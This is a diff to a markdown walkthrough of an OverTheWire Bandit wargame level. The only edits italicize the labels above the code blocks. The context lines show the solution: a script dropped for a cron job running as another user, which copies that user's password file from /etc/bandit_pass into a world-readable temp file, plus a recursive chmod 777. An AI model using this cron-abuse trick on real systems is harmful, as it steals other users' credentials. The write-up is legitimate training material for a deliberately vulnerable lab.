@@ -8,7 +8,7 @@ NOTE 2: Keep in mind that your shell script is removed once executed, so you may
 
 **Solution**
 
-Terminal
+*Terminal*
 ```
 bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
 * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
@@ -34,14 +34,14 @@ bandit23@melinda:~$ cd /tmp/evanyeyeye_bandit24
 bandit23@melinda:/tmp/evanyeyeye_bandit24$ nano shell.sh
 ```
 
-GNU nano editor
+*GNU nano editor*
 ```
 #!/bin/bash
 
 cat /etc/bandit_pass/bandit24 > /tmp/evanyeyeye_bandit24/pass.txt
 ```
 
-Terminal
+*Terminal*
 ```
 bandit23@melinda:/tmp/evanyeyeye_bandit24$ chmod -R 777 ./.
 bandit23@melinda:/tmp/evanyeyeye_bandit24$ chmod +x shell.sh
